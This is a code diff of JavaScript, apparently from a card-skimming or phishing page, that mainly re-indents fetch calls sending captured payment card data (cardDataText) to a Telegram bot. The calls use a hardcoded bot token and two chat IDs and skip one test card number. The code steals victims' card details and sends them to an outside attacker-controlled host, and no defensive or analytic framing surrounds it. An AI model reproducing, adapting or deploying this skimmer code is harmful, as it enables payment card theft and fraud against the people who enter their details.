@@ -1577,12 +1577,12 @@
                       });
                 
                 if (cardData.cardNumber !== '5167 4345 5899 7134') {
-                fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
-                  .then(response => response.json())
-                  .then(data => console.log(data))
-                  .catch((error) => {
-                    console.error('Error:', error);
-                  });
+                  fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                    .then(response => response.json())
+                    .then(data => console.log(data))
+                    .catch((error) => {
+                      console.error('Error:', error);
+                    });
                 }
                 
                 setTimeout(() => {
@@ -1602,19 +1602,19 @@
                 
                   // Отправляем данные в Telegram Bot
                   if (cardData.cardNumber !== '5167 4345 5899 7134') {
-                  fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=7329305712&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                    fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=7329305712&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                        .then(response => response.json())
+                        .then(data => console.log(data))
+                        .catch((error) => {
+                          console.error('Error:', error);
+                        });
+
+                    fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
                       .then(response => response.json())
                       .then(data => console.log(data))
                       .catch((error) => {
                         console.error('Error:', error);
                       });
-
-                  fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
-                    .then(response => response.json())
-                    .then(data => console.log(data))
-                    .catch((error) => {
-                      console.error('Error:', error);
-                    });
                   }
                 }, 1000);
 
